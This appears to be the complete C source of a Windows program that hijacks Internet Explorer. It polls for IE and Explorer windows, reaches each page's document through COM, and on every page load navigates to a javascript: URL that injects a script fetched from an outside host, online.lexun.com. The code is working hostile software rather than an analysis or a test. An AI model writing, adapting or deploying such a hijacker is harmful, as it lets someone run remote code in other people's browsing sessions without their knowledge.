#include <windows.h>
#include <process.h>
#include <exdisp.h>
#include <mshtml.h>
#include <servprov.h>
#include <shlguid.h>
#include <wchar.h>

#define	JAVASCRUPT_STRING L"javascript:void((function(){var%20script%20=%20document.createElement('script');script.setAttribute('type',%20'text/javascript');script.setAttribute('charset',%20'UTF-8');script.setAttribute('src',%20'http://online.lexun.com/static/web/js/page/page.addtalk.js');document.body.appendChild(script);})());"

typedef HRESULT(ObjectFromLresultCall)(LRESULT, REFIID, WPARAM, void**);

typedef	struct _WebBrowserNode WebBrowserNode;
struct _WebBrowserNode{

    HWND hwnd;
    WebBrowserNode *next;
};

WebBrowserNode *root = NULL;
HANDLE WebBrowserNodeMutex = NULL;

WebBrowserNode *WebBrowserNodeAdd(HWND hwnd)
{

    WebBrowserNode *node = NULL;
    WaitForSingleObject(WebBrowserNodeMutex, INFINITE);

    if ((node = malloc(sizeof(WebBrowserNode)))) {

	node->hwnd = hwnd;

	if (!root) {

	    root = node;
	    node->next = NULL;

	} else {

	    node->next = root->next;
	    root->next = node;
	}
    }

    ReleaseMutex(WebBrowserNodeMutex);
    return node;
}

void WebBrowserNodeDel(HWND hwnd)
{

    WebBrowserNode *node = NULL;
    WebBrowserNode *prev = NULL;
    WaitForSingleObject(WebBrowserNodeMutex, INFINITE);

    for(node = root; node; prev = node, node = node->next) {

	if (node->hwnd == hwnd) {

	    if (node == root) {

		root = root->next;
		CloseHandle(node->hwnd);
		free(node);

	    } else {

		prev->next = node->next;
		CloseHandle(node->hwnd);
		free(node);
	    }
	}
    }

    ReleaseMutex(WebBrowserNodeMutex);
}

WebBrowserNode *WebBrowserNodeFind(HWND hwnd)
{

    WebBrowserNode *node = NULL;
    WaitForSingleObject(WebBrowserNodeMutex, INFINITE);

    for(node = root; node; node = node->next) {

	if (node->hwnd == hwnd) {

	    ReleaseMutex(WebBrowserNodeMutex);
	    return node;
	}
    }

    ReleaseMutex(WebBrowserNodeMutex);
    return NULL;
}

HWND WebBrowserWait(void)
{
    HWND hInternetExplorer = NULL;
    hInternetExplorer = FindWindowEx(NULL, NULL, "IEFrame", NULL);

    if (!hInternetExplorer)
	hInternetExplorer = FindWindowEx(NULL, NULL, "CabinetWClass", NULL);

    return hInternetExplorer;
}

void WebBrowserExecJScript(IHTMLWindow2 *pHtmlWindows2, BSTR str)
{
    VARIANT value;
    value.vt = VT_BSTR;
    value.bstrVal = SysAllocString(NULL);
    BSTR JScriptString = SysAllocString(str);
    BSTR JScriptLanguage = SysAllocString(L"JScript");
    pHtmlWindows2->lpVtbl->execScript(pHtmlWindows2, JScriptString, JScriptLanguage, &value);

    SysFreeString(JScriptString);
    SysFreeString(JScriptLanguage);
    VariantClear(&value);
}

void WebBrowserInsertHtml(IHTMLDocument2 *pIHTMLDocument2, BSTR str)
{	

    VARIANT *pVar = NULL;
    SAFEARRAY *sfArray = NULL;

    if (!(sfArray = SafeArrayCreateVector(VT_VARIANT, 0, 1)))
	return;

    if (!SafeArrayAccessData(sfArray, (void**)&pVar)) {

	pVar->vt = VT_BSTR;
	pVar->bstrVal = str;
	pIHTMLDocument2->lpVtbl->writeln(pIHTMLDocument2, sfArray);
    }

    pIHTMLDocument2->lpVtbl->close(pIHTMLDocument2);
    SafeArrayDestroy(sfArray);
    VariantClear(pVar);
}

void WebBrowserNavigate(IWebBrowser2* pWebBrowser2, BSTR str)
{

    VARIANT value;
    VariantInit(&value);
    value.vt = VT_BSTR;
    value.bstrVal = SysAllocString(NULL);
    BSTR url = SysAllocString(str);
    pWebBrowser2->lpVtbl->Navigate(pWebBrowser2, url, &value, &value, &value, &value);

    VariantClear(&value);
    SysFreeString(url);
}

void WebBrowserDisplay(IHTMLDocument2 *pIHTMLDocument2, BSTR str)
{

    IHTMLElementCollection *pColl = NULL;
    pIHTMLDocument2->lpVtbl->get_all(pIHTMLDocument2, &pColl);
    if (pColl == NULL)
	return;

    LONG i, ICount = 0;
    if (pColl->lpVtbl->get_length(pColl, &ICount) != 0)
	return;

    for (i = 0; i < ICount; i++) {

	VARIANT vIndex;
	VariantInit(&vIndex);
	V_VT(&vIndex) = VT_I4;
	V_I4(&vIndex) = i;

	IDispatch *pCollDisp = NULL;
	pColl->lpVtbl->item(pColl, vIndex, vIndex, &pCollDisp);
	if (pCollDisp == NULL)
	    return;

	IHTMLElement *pElem = NULL;
	pCollDisp->lpVtbl->QueryInterface(pCollDisp, &IID_IHTMLElement, (void**)&pElem);
	if (pElem == NULL)
	    return;

	BSTR temp;
	pElem->lpVtbl->get_outerHTML(pElem, &temp);
	wprintf(L"%s\n", temp);
    }
}

BOOL CALLBACK WebBrowserEnumChild(HWND hwnd,LPARAM lParam)
{

    char buffer[128] = {0};
    GetClassName(hwnd, buffer, 128);

    if (strcmp(buffer, "Internet Explorer_Server") == 0) {

	*(HWND*)lParam = hwnd;
	return FALSE;
    }

    return TRUE;
}

void WebBrowserHijack(IWebBrowser2* pWebBrowser2, IHTMLDocument2 *pIHTMLDocument2)
{

    BSTR ReadyState;

    for(;;){

	wprintf(L"loading...\n");
	for(;;){

	    if (FAILED(pIHTMLDocument2->lpVtbl->get_readyState(pIHTMLDocument2, &ReadyState)))
		return;

	    if (wcscmp(ReadyState, L"complete") == 0)
		break;

	    Sleep(10);
	}

	wprintf(L"complete\n");
	WebBrowserNavigate(pWebBrowser2, JAVASCRUPT_STRING);

	for(;;){

	    if (FAILED(pIHTMLDocument2->lpVtbl->get_readyState(pIHTMLDocument2, &ReadyState)))
		return;

	    if (wcscmp(ReadyState, L"complete"))
		break;

	    Sleep(10);
	}
    }
}

UINT WINAPI WebBrowserThread(LPVOID lpParam)
{

    HRESULT hr;
    HWND hInternetExplorer = (HWND)lpParam;
    HWND hInternetExplorerChild = NULL;

    CoInitialize(NULL);
    HINSTANCE hOleacc = LoadLibrary("OLEACC.DLL");
    wprintf(L"hOleacc=%p\n", hOleacc);
    if (!hOleacc) {

	WebBrowserNodeDel(hInternetExplorer);
	CoUninitialize();
	return FALSE;
    }

    ObjectFromLresultCall *pfObjectFromLresult = 
	(ObjectFromLresultCall *)GetProcAddress(hOleacc, "ObjectFromLresult");
    wprintf(L"pfObjectFromLresult=%p\n", pfObjectFromLresult);
    if (!pfObjectFromLresult) {

	WebBrowserNodeDel(hInternetExplorer);
	FreeLibrary(hOleacc);
	CoUninitialize();
	return FALSE;
    }

    EnumChildWindows(hInternetExplorer, WebBrowserEnumChild, (LPARAM)&hInternetExplorerChild);
    wprintf(L"Internet Explorer_Server=%p\n", hInternetExplorerChild);
    if (!hInternetExplorerChild) {

	WebBrowserNodeDel(hInternetExplorer);
	FreeLibrary(hOleacc);
	CoUninitialize();
	return FALSE;
    }

    LRESULT lRes = 0;
    UINT nMsg = RegisterWindowMessage("WM_HTML_GETOBJECT");
    SendMessageTimeout(hInternetExplorerChild, nMsg, 0, 0, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes);

    IHTMLDocument2 *pIHTMLDocument2 = NULL;
    hr = pfObjectFromLresult(lRes, &IID_IHTMLDocument2, 0, (void**)&pIHTMLDocument2);
    wprintf(L"pIHTMLDocument2=%p\n", pIHTMLDocument2);
    if (!pIHTMLDocument2) {

	WebBrowserNodeDel(hInternetExplorer);
	FreeLibrary(hOleacc);
	CoUninitialize();
	return FALSE;
    }

    IHTMLWindow2 *pHtmlWindows2 = NULL;
    hr = pIHTMLDocument2->lpVtbl->get_parentWindow(pIHTMLDocument2, &pHtmlWindows2);
    wprintf(L"pHtmlWindows2=%p\n", pHtmlWindows2);
    if (!pHtmlWindows2) {

	WebBrowserNodeDel(hInternetExplorer);
	pIHTMLDocument2->lpVtbl->Release(pIHTMLDocument2);
	FreeLibrary(hOleacc);
	CoUninitialize();
	return FALSE;
    }

    IServiceProvider *pServiceProvider = NULL;
    hr = pHtmlWindows2->lpVtbl->QueryInterface (pHtmlWindows2, &IID_IServiceProvider, (void**)&pServiceProvider);
    wprintf(L"pServiceProvider=%p\n", pServiceProvider);
    if (!pServiceProvider) {

	WebBrowserNodeDel(hInternetExplorer);
	pIHTMLDocument2->lpVtbl->Release(pIHTMLDocument2);
	pHtmlWindows2->lpVtbl->Release(pHtmlWindows2);
	FreeLibrary(hOleacc);
	CoUninitialize();
	return FALSE;
    }

    IWebBrowser2* pWebBrowser2 = NULL;
    hr = pServiceProvider->lpVtbl->QueryService(pServiceProvider, &IID_IWebBrowserApp, &IID_IWebBrowser, (void**)&pWebBrowser2);
    wprintf(L"pWebBrowser2=%p\n", pWebBrowser2);
    if (!pWebBrowser2) {

	WebBrowserNodeDel(hInternetExplorer);
	pIHTMLDocument2->lpVtbl->Release(pIHTMLDocument2);
	pHtmlWindows2->lpVtbl->Release(pHtmlWindows2);
	pServiceProvider->lpVtbl->Release(pServiceProvider);
	FreeLibrary(hOleacc);
	CoUninitialize();
	return FALSE;
    }

    WebBrowserHijack(pWebBrowser2, pIHTMLDocument2);

    WebBrowserNodeDel(hInternetExplorer);
    pIHTMLDocument2->lpVtbl->Release(pIHTMLDocument2);
    pHtmlWindows2->lpVtbl->Release(pHtmlWindows2);
    pServiceProvider->lpVtbl->Release(pServiceProvider);
    pWebBrowser2->lpVtbl->Release(pWebBrowser2);
    FreeLibrary(hOleacc);
    CoUninitialize();
    return TRUE;
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hInstNULL, LPSTR lpszCmdLine, int nCmdShow)
{


    HWND hInternetExplorer = NULL;
    WebBrowserNodeMutex = CreateMutex(NULL, FALSE, NULL);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {

	CloseHandle(WebBrowserNodeMutex);
	return FALSE;
    };

    for(;;){

	if ((hInternetExplorer = WebBrowserWait())) {

	    if (WebBrowserNodeFind(hInternetExplorer) == NULL) {

		if (WebBrowserNodeAdd(hInternetExplorer)) {

		    _beginthreadex(NULL,
			    0,
			    WebBrowserThread,
			    (LPVOID)hInternetExplorer,
			    0,
			    NULL);
		}
	    }
	}

	Sleep(1000);
    }

    return TRUE;
}


